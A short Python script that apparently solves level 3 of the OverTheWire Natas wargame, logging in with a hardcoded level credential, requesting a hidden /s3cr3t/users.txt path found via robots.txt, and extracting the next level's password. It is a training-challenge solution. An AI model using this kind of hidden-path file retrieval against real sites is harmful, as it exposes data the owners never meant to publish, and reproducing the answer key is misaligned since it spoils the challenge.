import requests
import re #regular expression

username = 'natas3'
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'

#url = 'http://%s.natas.labs.overthewire.org' % username
#url = 'http://%s.natas.labs.overthewire.org/robots.txt' % username
#url = 'http://%s.natas.labs.overthewire.org/s3cr3t/' % username
url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % username

# auth = (user,pass) HTTP Basic Auth

reponse = requests.get(url, auth = (username, password))

content = reponse.text

#print(content)

print(re.findall('natas4:(.*)', content)[0])
